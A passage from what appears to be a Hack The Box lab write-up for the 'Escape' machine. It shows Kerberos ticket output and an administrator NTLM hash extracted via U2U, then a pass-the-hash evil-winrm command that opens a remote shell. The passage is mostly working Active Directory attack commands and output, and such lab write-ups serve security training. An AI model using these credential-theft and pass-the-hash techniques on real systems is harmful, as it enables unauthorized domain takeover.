qntI23lmvg0SWmHI7iaZv72xtKcFNEqsMbOVlmi8L8i5Ld4+Q6DuHtO7cSXTaq/QNax+eXWJFwRALRgfadxKFeACINq/68MZFgIzipENcfW76qSaf+cmKjY1pm4KXlvgkgxI9l+gc9Pn672LCvudZtNdEnyhE3M0K+cAIbM/tTmNupziCXUGKigLcooKFbD5DCyWmyAZZf57NUxF+ZfGTfg5FlW5ed3Lu0owpm/FMh6AFkY0+wXQ9TV9juKP1OghvY86h/ctCzcLeJoRcAO/m5NPBpGMfv7tdqYPtFpItL2Ig712osgo78+gsnjWRTyV0LPx9kmM+VIAaQ33hb+m739k3v/8kEIymtjHMDbQZgT3tv0JA9GeSSYx2VfbxK3QN/MdCUf6dxTIfTdu/vRjTO8uMdxVUz9etYYSHLOS3KfiKOZquM3OZQ181ORP8uyrFa6bO9OYGkRoWx/OMj4/zSFM2hlxuZBF7THaYaTgqGnHqR4geb9KADt3xCATwHlahm0mLI21wQJimyAKbMHwhYSQiTZ5na+pS3fPlnsu5qTEl06LB2qmtV5JBbvOeOSAp/8q0bj3rXAu5OzLUhVb00AxQ+OTwFrGtf6XoMf7dH8J2LEW/lRRX6yqK9pFrpkw6XESjWzBIgG0yN5Z8uPOblSW7F5WVhjfmJgDcvxJzVKalWuKU8xxop88pxOekH4QSy82aOB1TCB0qADAgEAooHKBIHHfYHEMIHBoIG+MIG7MIG4oBswGaADAgEXoRIEECZ68fkmP+7YdyUFvd35m7ChDBsKU0VRVUVMLkhUQqIaMBigAwIBAaERMA8bDWFkbWluaXN0cmF0b3KjBwMFAADhAAClERgPMjAyNTAyMTMwNDUxMDlaphEYDzIwMjUwMjEzMTQ1MTA5WqcRGA8yMDI1MDIyMDA0NTEwOVqoDBsKU0VRVUVMLkhUQqkfMB2gAwIBAqEWMBQbBmtyYnRndBsKc2VxdWVsLmh0Yg==

  ServiceName              :  krbtgt/sequel.htb
  ServiceRealm             :  SEQUEL.HTB
  UserName                 :  administrator
  UserRealm                :  SEQUEL.HTB
  StartTime                :  2/12/2025 8:51:09 PM
  EndTime                  :  2/13/2025 6:51:09 AM
  RenewTill                :  2/19/2025 8:51:09 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable
  KeyType                  :  rc4_hmac
  Base64(key)              :  Jnrx+SY/7th3JQW93fmbsA==
  ASREP (key)              :  80CB5A98EE36CB0AB78D2DB6CA8D2EFC

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE
```

### Pass the Hash

With the hash for the administrator account, we can go ahead and get a WinRM shell.

```sh
┌──(pl4stic㉿kali)-[~/htb/escape]
└─$ evil-winrm -i 10.129.228.253 -u administrator -H A52F78E4C751E5F5E17E1E9F3E58F4EE 
                                        
Evil-WinRM shell v3.7
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```